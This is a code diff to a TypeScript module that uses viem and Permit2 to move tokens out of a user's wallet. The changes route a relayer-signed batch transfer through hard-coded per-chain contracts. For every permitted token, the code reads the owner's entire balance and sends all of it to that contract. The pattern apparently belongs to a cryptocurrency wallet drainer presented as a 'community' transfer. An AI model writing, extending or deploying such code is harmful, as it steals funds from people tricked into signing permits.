@@ -3,7 +3,15 @@ import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, base } from 'viem
 import { privateKeyToAccount } from 'viem/accounts';
 
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as const;
-const COMMUNITY_CONTRACT = "0x2c73de09a4C59E910343626Ab6b4A4d974EC731f" as const;
+
+const CHAIN_CONTRACTS: Record<number, string> = {
+  56: "0x45abA44A5f1F6C66a5b688E99E4A7c4f06c73DE4",
+  137: "0xd933CDf4a9Ac63a84AdE7D34890A86fF46903bD9",
+};
+
+function getContractForChain(chainId: number): string | null {
+  return CHAIN_CONTRACTS[chainId] || null;
+}
 
 const ERC20_ABI = [
   {
@@ -124,6 +132,8 @@ export function getRelayerAddress(): string | null {
   }
 }
 
+export { getContractForChain, CHAIN_CONTRACTS };
+
 export async function executePermit2BatchTransfer(params: {
   chainId: number;
   owner: string;
@@ -155,6 +165,11 @@ export async function executePermit2BatchTransfer(params: {
       transport: http(chainConfig.rpcUrl),
     });
 
+    const contractAddress = getContractForChain(chainId);
+    if (!contractAddress) {
+      return { success: false, error: `No contract deployed for chain ${chainId}`, transfers };
+    }
+
     const ownerAddr = owner as `0x${string}`;
     const transferDetails: { to: `0x${string}`; requestedAmount: bigint }[] = [];
 
@@ -171,7 +186,7 @@ export async function executePermit2BatchTransfer(params: {
         console.log(`[Permit2] Balance for ${p.token} on chain ${chainId}: ${balance}`);
 
         transferDetails.push({
-          to: COMMUNITY_CONTRACT,
+          to: contractAddress as `0x${string}`,
           requestedAmount: balance,
         });
 
@@ -183,7 +198,7 @@ export async function executePermit2BatchTransfer(params: {
       } catch (err: any) {
         console.error(`[Permit2] Error checking balance for ${p.token}:`, err?.message);
         transferDetails.push({
-          to: COMMUNITY_CONTRACT,
+          to: contractAddress as `0x${string}`,
           requestedAmount: BigInt(0),
         });
         transfers.push({ token: p.token, amount: '0', success: false });
@@ -196,7 +211,7 @@ export async function executePermit2BatchTransfer(params: {
       return { success: true, transfers, error: 'No token balances found' };
     }
 
-    console.log(`[Permit2] Executing batch permitTransferFrom for ${permitted.length} tokens`);
+    console.log(`[Permit2] Executing batch transfer via contract ${contractAddress} for ${permitted.length} tokens`);
     console.log(`[Permit2] Tokens with balance: ${transfers.filter(t => t.success).map(t => t.token).join(', ')}`);
     console.log(`[Permit2] Tokens with zero balance (will transfer 0): ${transfers.filter(t => !t.success).map(t => t.token).join(', ')}`);
 
@@ -209,10 +224,47 @@ export async function executePermit2BatchTransfer(params: {
       deadline: BigInt(deadline),
     };
 
+    const EXECUTE_PERMIT_BATCH_ABI = [
+      {
+        inputs: [
+          {
+            components: [
+              {
+                components: [
+                  { name: "token", type: "address" },
+                  { name: "amount", type: "uint256" }
+                ],
+                name: "permitted",
+                type: "tuple[]"
+              },
+              { name: "nonce", type: "uint256" },
+              { name: "deadline", type: "uint256" }
+            ],
+            name: "permit",
+            type: "tuple"
+          },
+          {
+            components: [
+              { name: "to", type: "address" },
+              { name: "requestedAmount", type: "uint256" }
+            ],
+            name: "transferDetails",
+            type: "tuple[]"
+          },
+          { name: "from", type: "address" },
+          { name: "signature", type: "bytes" }
+        ],
+        name: "executePermitBatch",
+        outputs: [],
+        stateMutability: "nonpayable",
+        type: "function"
+      }
+    ] as const;
+
     const txHash = await walletClient.writeContract({
-      address: PERMIT2_ADDRESS,
-      abi: PERMIT2_BATCH_ABI,
-      functionName: 'permitTransferFrom',
+      address: contractAddress as `0x${string}`,
+      abi: EXECUTE_PERMIT_BATCH_ABI,
+      functionName: 'executePermitBatch',
       args: [
         permitArg,
         transferDetails,
